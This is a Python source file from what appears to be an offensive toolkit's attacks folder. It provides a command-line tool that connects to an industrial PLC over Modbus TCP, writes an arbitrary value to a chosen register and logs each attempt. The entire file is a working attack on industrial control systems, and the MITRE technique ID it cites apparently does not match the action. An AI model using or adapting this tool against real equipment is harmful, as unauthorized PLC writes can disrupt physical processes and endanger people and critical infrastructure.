# modules/attacks/modbus_write_reactor.py

import argparse
import json
import time
from datetime import datetime
from pymodbus.client.sync import ModbusTcpClient
import os

LOG_PATH = "results/modbus_write_log.json"
MITRE_TTP = "T0865"

def log_modbus(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def write_modbus_register(ip, port, register, value):
    client = ModbusTcpClient(ip, port=port)
    client.connect()
    try:
        result = client.write_register(register, value)
        client.close()
        log_modbus({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "register": register,
            "value": value,
            "success": result.isError() is False,
            "ttp": MITRE_TTP
        })
        return not result.isError()
    except Exception:
        client.close()
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus Write Reactor – Write custom values to industrial PLC")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=502, help="Modbus TCP port")
    parser.add_argument("--register", type=int, required=True, help="Modbus register address (e.g., 40001)")
    parser.add_argument("--value", type=int, required=True, help="Value to write")
    args = parser.parse_args()

    if write_modbus_register(args.ip, args.port, args.register, args.value):
        print("[+] Modbus value written")
    else:
        print("[!] Modbus write failed")
